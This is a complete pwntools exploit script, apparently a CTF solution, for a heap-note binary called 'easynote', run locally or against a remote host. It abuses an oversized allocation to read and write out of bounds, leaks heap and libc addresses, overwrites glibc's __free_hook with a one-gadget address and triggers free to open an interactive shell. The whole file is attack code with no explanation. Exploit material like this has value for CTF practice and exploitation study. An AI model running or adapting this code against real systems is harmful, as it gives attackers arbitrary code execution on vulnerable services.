from pwn import *
import sys

context(os='linux', arch='amd64')
#context.log_level = 'debug'

libc = ELF('./libc-2.26.so')    # use whatever version

if len(sys.argv) == 1:
    r = process('./easynote')
else:
    r = remote(sys.argv[1], int(sys.argv[2]))

def make_nb(n):
    r.recvuntil(': ')
    r.sendline('0')
    r.recvuntil(': ')
    r.sendline(str(n))

def del_nb(n):
    r.recvuntil(': ')
    r.sendline('1')
    r.recvuntil(': ')
    r.sendline(str(n))

def read(n, i):
    r.recvuntil(': ')
    r.sendline('2')
    r.recvuntil(': ')
    r.sendline(str(n))
    r.recvuntil(': ')
    r.sendline(str(i))
    s = r.recvuntil('\n0. Create', drop=True)
    return s

def write(n, i, s):
    r.recvuntil(': ')
    r.sendline('3')
    r.recvuntil(': ')
    r.sendline(str(n))
    r.recvuntil(': ')
    r.sendline(str(i))
    r.recvuntil(': ')
    r.sendline(s)

make_nb(2**64 >> 3)
make_nb(128)
make_nb(1)
del_nb(1)

heap_top_addr = u64(read(0, 2).ljust(8, '\x00'))
print '[+] Found top: 0x%x' % heap_top_addr

free_chunk_addr = heap_top_addr - (16 + 2 * 8) - (16 + 16 + 128 * 8)
print '[+] Address of free chunk: 0x%x' % free_chunk_addr

libc_leak_addr = free_chunk_addr + (16 + 256) + 16
print '[+] Address of libc pointer: 0x%x' % libc_leak_addr

write(1, 0, p64(libc_leak_addr))
libc_leak = u64(read(0, 2).ljust(8, '\x00'))
libc_base = libc_leak - 0x3dac78 # replace with appropriate libc constants (addr of main_arena->top)
print '[+] Libc base: 0x%x' % libc_base

hook_addr = libc_base + libc.symbols['__free_hook']
magic_addr = libc_base + 0xfccde # replace with appropriate libc constants (addr of magic)

print '[*] Overwrite free_hook'
write(1, 0, p64(hook_addr))
write(0, 2, p64(magic_addr))

print('[*] Trigger free')
del_nb(0)

r.interactive()
